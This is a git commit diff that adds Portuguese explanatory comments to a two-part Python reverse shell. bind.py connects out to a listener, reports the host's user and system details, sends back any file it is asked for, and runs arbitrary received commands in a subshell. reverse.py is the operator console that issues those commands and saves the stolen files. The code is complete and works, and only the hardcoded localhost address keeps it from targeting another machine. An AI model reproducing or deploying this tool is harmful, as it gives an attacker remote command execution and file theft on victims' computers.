fa6119ceae644ecb8ba7344a45746a9dae7070b5
Joelalexandre560 <joelalexandreff@hotmail.com>
2019-02-10 17:40:49 +0000

    fast_docs

--- bind.py
+++ bind.py
@@ -1,12 +1,19 @@
-import os
-import socket
-import platform
-import subprocess
-from colorama import Fore, Back, Style, init
-init()
+#-------------------------------------
+#----Requer Python --version 3.7.0----
+#-------------------------------------
+#----Developer: Joeru AKA(Joerito)----
+#-------------------------------------
+import os #os import para subshell calls
+import socket #Import para criar o socket para comunicação entre reverse e bind
+import platform #Import para extrair alguma informação sobre a plataforma do bind
+import subprocess #Import para criar subshell e executar comandos
+from colorama import Fore, Back, Style, init #Import para adicionar cor ao texto do terminal
+init() #init call para compatibilidade com windows
 
+#Classe para o setup de cores
 class Cor:
 
+    #Método __init__() para inicializar algumas cores predefinidas
     def __init__(self):
         self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
         self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
@@ -22,18 +29,29 @@ class Cor:
 
         self.reset       = Style.RESET_ALL
 
+    #Método Sucesso(self, texto), utilização Sucesso('texto'), para Mensagens de Sucesso
     def Sucesso(self, texto):
         return print(self.sucesso + texto + self.reset)
 
+    #Método Aviso(self, texto), utilização Aviso('texto'), para Mensagens de Aviso
     def Aviso(self, texto):
         return print(self.aviso + texto + self.reset)
 
+    #Método Erro(self, texto), utilização Erro('texto'), para Mensagens de Erro
     def Erro(self, texto):
         return print(self.erro + texto + self.reset)
 
+    #Método Inputs(self, texto), utilização em input(Inputs('texto')), para Prompt de Input 
     def Inputs(self, texto):
         return print(self.inputs + texto + self.reset)
 
+    #Método Mensagem(self, tipo, texto), utilização Mensagem(0,'texto')
+    #----------------Exemplos----------------
+    #   Mensagem(0,'texto') -> 0==sucesso
+    #   Mensagem(1,'texto') -> 1==aviso
+    #   Mensagem(2,'texto') -> 2==erro
+    #   Mensagem(3,'texto') -> 3==inputs
+    #----------------------------------------
     def Mensagem(self, tipo, texto):
         if tipo == 0:
             return print(self.sucesso + '[+]' + self.reset, texto)
@@ -44,9 +62,10 @@ class Cor:
         elif tipo == 3:
             return print(self.inputs + '[->]' + self.reset, texto)
 
-
+#Classe para extrair intel, info sobre a plataforma do bind
 class Plataforma:
 
+    #Método __init__() para inicializar a extração de intel, info sobre a plataforma do bind
     def __init__(self):
         self.Utilizador     = str(os.getlogin())
         self.Nome_PC        = str(platform.node())
@@ -58,18 +77,29 @@ class Plataforma:
         self.CPU_           = str(os.cpu_count())
         self.CPU_Num        = str(os.cpu_count())
 
+    #Método Mostrar_Info() return uma string com sobre a plataforma do bind, utilização Mostrar_Info()
     def Mostrar_Info(self):
         return "\nUtilizador: "+self.Utilizador+"\nNome do PC: "+self.Nome_PC+"\nSistema Operativo: "+self.Sistema+" "+self.OS_Ver+"\nOS Versao: "+self.OS_Full_Ver+"\nArquitetura: "+self.Arquitetura+"\nMaquina: "+self.Maquina+"\nProcessador: "+self.CPU_+" "+self.CPU_Num+" Cores"
 
 
+#Classse SUBSHELL() prepara uma subshell
 class SUBSHELL:
 
+    #Método Executar(self, modo, comando), utilização Executar(0,'comando_para_ser_executado')
     def Executar(self, modo, comando):
 
-        sub_proccess    = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        #sub_shell recebe um subprocess e conecta com as pipes de stdout, stderr e stdin
+        sub_shell       = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         
-        raw_output      = sub_proccess.stdout.read() + sub_proccess.stderr.read()
+        #raw_output recebe o valor do stdout or(ou) do stderr
+        raw_output      = sub_shell.stdout.read() + sub_shell.stderr.read()
+        #str_output converte o valor raw_output para str() string
         str_output      = str(raw_output,'latin-1')
+
+        #-----------------------------------Exemplos de utilização do Método Executar()-----------------------------------
+        #   Executar(0,'comando_para_ser_executado') -> 0==envia o output para o reverse
+        #   Executar(1,'comando_para_ser_executado') -> 1==envia o output para o reverse e também printa o output no bind
+        #-----------------------------------------------------------------------------------------------------------------
 
         if modo == 0:
             S.SOCKET.send(str.encode(str_output+'\n '))
@@ -80,43 +110,53 @@ class SUBSHELL:
             Texto.Mensagem(1,'MODO 0 OR 1')
 
 
+#Classe para prepara a conexão entre o bind e o reverse
 class Cliente_SOCKET:
 
+    #                                              host pode ser o domain ou ipv4
+    #Preparar o socket em modo AF_INET para tuplo (host,porta), SOCK_STREAM==TCP
     SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+    #Método __init__() para inicializar valores predefinidos
     def __init__(self):
-        self.InternetProtocol   = '127.0.0.1'
+        self.InternetProtocol   = '127.0.0.1' #Neste caso LocalHost
         self.Porta              = 9999
 
+    #Método Preparar_Conection() para tentar conectar a reverse. Except para timeout 
     def Preparar_Conection(self):
         try:
             self.SOCKET.connect((self.InternetProtocol, self.Porta))
-            Texto
         except ConnectionRefusedError:
             Texto.Mensagem(2,'Timeout')
         else:
             Texto.Mensagem(0,'Conetado (:')
 
+    #Método Comandos() inicia algumas regras conforme os valores recebidos nos pacotes
     def Comandos(self):
         while True:
 
             pacotes_rcv=self.SOCKET.recv(1024).decode('utf-8')
 
+            #se pacotes_rcv conter string 'sair' finaliza conexão
             if 'sair' in pacotes_rcv:
                 Texto.Mensagem(1,'A Encerrar')
                 self.SOCKET.close()
                 break
 
+            #se pacotes_rcv conter string 'limpar' executa em subshell cls e(and) clear
             elif 'limpar' in pacotes_rcv:
                 os.system('cls')
                 os.system('clear')
 
+            #se pacotes_rcv conter string 'infocliente' executa Plat.Mostar_Info(), obs: Plat=Plataforma()
             elif 'infocliente' in pacotes_rcv:
                 self.SOCKET.send(str.encode(Plat.Mostrar_Info()))
 
+            #se pacotes_rcv conter string 'chdir', o nome do diretório fica para depois de 'chdir '
             elif 'chdir' in pacotes_rcv:
                 diretorio=pacotes_rcv[6:]
 
+                #tenta executar o chdir caso exista algum erro, excepts são criados e code call predefinidos são enviados para a reverse
                 try:
                     os.chdir(diretorio)
                 except FileExistsError:
@@ -125,12 +165,15 @@ class Cliente_SOCKET:
                     self.SOCKET.send(str.encode('NOT_DIR'))
                 except OSError:
                     self.SOCKET.send(str.encode('OS_ERR'))
+                #senão o diretorio atual é enviado para a reverse
                 else:
                     self.SOCKET.send(str.encode(os.getcwd()))
 
+            #se pacotes_rcv conter string 'file', o nome do ficheiro fica para depois de 'file '
             elif 'file' in pacotes_rcv:
                 ficheiro_nome=pacotes_rcv[5:]
 
+                #tenta abrir o ficheiro em modo leitura, excepts são criados e code call predefinidos são enviados para a reverse
                 try:
                     ficheiro=open(ficheiro_nome,'r')
                 except FileNotFoundError:
@@ -139,25 +182,28 @@ class Cliente_SOCKET:
                     self.SOCKET.send(str.encode('NOT_FILE'))
                 except IsADirectoryError:
                     self.SOCKET.send(str.encode('NOT_FILE'))
+                #senão guarda os dados do ficheiro numa variável, fecha o ficheiro e finalmente envia os dados do ficheiro para a reverse
                 else:
                     ficheiro_dados=ficheiro.read()
                     ficheiro.close()
                     S.SOCKET.send(str.encode(ficheiro_dados))
 
+            #se comando não conter nenhuma string que entre no conjunto de regras predefinidas a string contida no comando é executada na subshell e o output do stdout ou(or) stderr é enviado para o reverse
             else:
                 Shell.Executar(1,pacotes_rcv)
 
 
-Texto=Cor()
-Plat=Plataforma()
-S=Cliente_SOCKET()
-Shell=SUBSHELL()
+Texto=Cor() #Texto recebe classe Cor()
+Plat=Plataforma() #Plat recebe classe Plataforma()
+S=Cliente_SOCKET() #S recebe classe Cliente_SOCKET()
+Shell=SUBSHELL() #Shell recebe classe SUBSHELL()
 
+#Função main() é onde prepara a conexão com a reverse e depois são se tudo der certo xd exemplo: se não houver nenhum timeout, é inicializado os comandos
 def main():
     S.Preparar_Conection()
     S.Comandos()
 
-main()
+main()#O programa começa aqui
 
 
         
--- reverse.py
+++ reverse.py
@@ -1,10 +1,18 @@
-import os
-import socket
-from colorama import Fore, Back, Style, init
-init()
+#-------------------------------------
+#----Requer Python --version 3.7.0----
+#-------------------------------------
+#----Developer: Joeru AKA(Joerito)----
+#-------------------------------------
+import os #os import para subshell calls
+import socket #Import para criar o socket para comunicação entre reverse e bind
+from colorama import Fore, Back, Style, init #Import para adicionar cor ao texto do terminal
+init() #init call para compatibilidade com windows
 
+
+#Classe para o setup de cores
 class Cor:
 
+    #Método __init__() para inicializar algumas cores predefinidas
     def __init__(self):
         self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
         self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
@@ -20,18 +28,29 @@ class Cor:
 
         self.reset       = Style.RESET_ALL
 
+    #Método Sucesso(self, texto), utilização Sucesso('texto'), para Mensagens de Sucesso
     def Sucesso(self, texto):
         return print(self.sucesso + texto + self.reset)
-
+    
+    #Método Aviso(self, texto), utilização Aviso('texto'), para Mensagens de Aviso
     def Aviso(self, texto):
         return print(self.aviso + texto + self.reset)
-
+    
+    #Método Erro(self, texto), utilização Erro('texto'), para Mensagens de Erro
     def Erro(self, texto):
         return print(self.erro + texto + self.reset)
-
+    
+    #Método Inputs(self, texto), utilização em input(Inputs('texto')), para Prompt de Input 
     def Inputs(self, texto):
         return print(self.inputs + texto + self.reset)
-
+    
+    #Método Mensagem(self, tipo, texto), utilização Mensagem(0,'texto')
+    #----------------Exemplos----------------
+    #   Mensagem(0,'texto') -> 0==sucesso
+    #   Mensagem(1,'texto') -> 1==aviso
+    #   Mensagem(2,'texto') -> 2==erro
+    #   Mensagem(3,'texto') -> 3==inputs
+    #----------------------------------------
     def Mensagem(self, tipo, texto):
         if tipo == 0:
             return print(self.sucesso + '[+]' + self.reset, texto)
@@ -43,68 +62,86 @@ class Cor:
             return print(self.inputs + '[->]' + self.reset, texto)
 
 
+#Classe para todos os menus adicionados
 class Grafico:
-
+    
+    #Método Menu(self), utilização Menu()
     def Menu(self):
         print(Texto.sucesso+'\n|-----ReverseShell-Menu-----|\n|---------------------------|'+Texto.pagina+'\n|  1 - Criar Servidor       |\n|  2 - Info                 |\n|  3 - Sair                 |\n|___________________________|\n'+Texto.reset)
-
+    
+    #Método Ajuda(self), utilização Ajuda()
     def Ajuda(self):
         print(Texto.sucesso+"\n|-------------------Help-Menu------------------|\n|----------------------------------------------|"+Texto.pagina+"\n|  limpar         ==  CMD:'CLS' BASH:'CLEAR'   |\n|  infocliente    ==  Informacao do Cliente    |\n|  sair           ==  Fecha Socket             |\n|                                              |\n|  chdir [FOLDER] ==  Troca Diretorio          |\n|  file [FILE]    ==  Obtém Dados do Ficheiro  |\n|______________________________________________|\n"+Texto.reset)
 
 
+#Classe para preparar conexao entre o reverse e bind
 class Servidor_SOCKET:
-
+    
+    #                                              host pode ser o domain ou ipv4
+    #Preparar o socket em modo AF_INET para tuplo (host,porta), SOCK_STREAM==TCP
     SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+    
+    #Método __init__() para inicializar parâmetros recebidos
     def __init__(self, InternetProtocol, Porta):
         self.InternetProtocol   = InternetProtocol
         self.Porta              = Porta
-
+    
+    #Método Preparar_SOCKET() para binding ipv4,porta e entrar em modo listener
     def Preparar_SOCKET(self):
         self.SOCKET.bind((self.InternetProtocol, self.Porta))
         Texto.Mensagem(0,'IP e Porta Binded')
         self.SOCKET.listen(1)
         Texto.Mensagem(1,'A Espera de um Cliente no IPv4: '+self.InternetProtocol+' na Porta: '+str(self.Porta))
-
+    
+    #Método Comandos() aceita o bind e inicia algumas regras
     def Comandos(self):
         CLIENTE, ENDERECO   = self.SOCKET.accept()
         Cliente_Endereco    = str(ENDERECO)
 
         Texto.Mensagem(0,'O Cliente: '+Cliente_Endereco+' entrou no Servidor\n\n\t[help] - Para mais informacao\n')
-
+        
+        #Loop infinito para analise de comando=input() digitados na reverse para enviar para o bind que posteriormente executados na bind a reverse recebe o stdout or(ou) stderr
         while True:
 
             comando = input('\n'+Texto.verde+'reverseshell'+Texto.amarelo+'@'+Texto.vermelho+ENDERECO[0]+Texto.magenta+'> '+Texto.reset)
             
+            #comando vazio == pass, equivalente pass
             if comando != '':
-
+                #se comando conter string 'sair' envia comando para bind que irá finalizar conexão
                 if 'sair' in comando:
                     CLIENTE.send(str.encode(comando))
                     CLIENTE.close()
                     os.system('clear')
                     os.system('cls')
                     break
-
+                #se comando conter string 'help' abre o menu Ajuda(), obs:G=Cor()
                 elif 'help' in comando:
                     G.Ajuda()
-
+                #se comando conter string 'limpar' envia comando para o bind para executar cls e(and) clear, reverse também executa em subshell cls e(and) clear
                 elif 'limpar' in comando:
                     CLIENTE.send(str.encode(comando))
                     os.system('clear')
                     os.system('cls')
-
+                #se comando conter string 'infocliente' envia comando para o bind para executar algumas calls de os, platform, todo o output return numa string, reverse recebe string e mostra o output na reverse
                 elif 'infocliente' in comando:
                     CLIENTE.send(str.encode(comando))
                     dados_rcv=str(CLIENTE.recv(2048),'utf-8')
                     print('Cliente:',ENDERECO)
                     print(dados_rcv)
-
+                #se comando conter string 'chdir' é realizado alguns checks para verificar se após 'chdir ' existe algum diretório no comando e também recebe alguns code calls que predefini do bind para a reverse detetar que tipo de mensagem mostrar  
                 elif 'chdir' in comando:
                     if comando[6:] == '':
                         Texto.Mensagem(2,'chdir [DIRETORIO]')
                     else:
                         CLIENTE.send(str.encode(comando))
                         dados_rcv=str(CLIENTE.recv(2048),'utf-8')
+
+                        #-------------------------------------------
+                        #---Exemplos code calls recebidos da bind---
+                        #   DIR_NA  ==   Diretório Não Encontrado
+                        #   NOT_DIR ==   Não é um Diretório
+                        #   OS_ERR  ==   Erro OS
+                        #-------------------------------------------
 
                         if 'DIR_NA' in dados_rcv:
                             Texto.Mensagem(2,'Diretorio Nao Encontrado')
@@ -115,6 +152,7 @@ class Servidor_SOCKET:
                         else:
                             print(dados_rcv)
 
+                #se comando conter string 'file' é realizado alguns checks para verificar se após 'file ' existe algum ficheiro no comando e também recebe alguns code calls que predefini do para a reverse detetar que tipo de mensagem mostrar, printar
                 elif 'file' in comando:
                     if comando[5:] == '':
                         Texto.Mensagem(2,'file [FICHEIRO]')
@@ -122,6 +160,13 @@ class Servidor_SOCKET:
                         ficheiro_nome=comando[5:]
                         CLIENTE.send(str.encode(comando))
                         dados_rcv=str(CLIENTE.recv(2048),'utf-8')
+
+                        #---------------------------------------------------------
+                        #----------Exemplos code calls recebidos da bind----------
+                        #   FILE_NF     ==   Ficheiro Não Encontrado
+                        #   NOT_FILE    ==   Sem Permissões ou Não é um Ficheiro
+                        #---------------------------------------------------------
+
                         if 'FILE_NF' in dados_rcv:
                             Texto.Mensagem(2,'Ficheiro Nao Encontrado')
                         elif 'NOT_FILE' in dados_rcv:
@@ -131,6 +176,7 @@ class Servidor_SOCKET:
                             ficheiro.write(dados_rcv)
                             ficheiro.close()
 
+                #se comando não conter nenhuma string que entre no conjunto de regras predefinidas a string contida no comando é enviada para o bind e será executado na subshell do bind e o output do stdout ou stderr será enviado da bind para o reverse mostrar, printar
                 else:
                     CLIENTE.send(str.encode(comando))
                     dados_rcv=str(CLIENTE.recv(2048),'utf-8')
@@ -139,14 +185,16 @@ class Servidor_SOCKET:
                 pass
 
 
-Texto=Cor()
-G=Grafico()
+Texto=Cor() #Texto recebe classe Cor()
+G=Grafico() #G recebe classe Grafico()
 
+#Função main() é onde será apresentado o Menu() num loop infinito para escolher entre 1 == Criar Servidor, 2 == Info, 3 == Sair
 def main():
     while True:
         G.Menu()
         opcao = str(input('Selecione uma opcao> '))
 
+        #S recebe classe Servidor_SOCKET . Também é executado os métodos Preparar_SOCKET() e Comandos()
         if '1' in opcao:
             os.system('clear')
             os.system('cls')
@@ -164,4 +212,4 @@ def main():
         elif '3' in opcao:
             break
 
-main()
+main()#O programa começa aqui
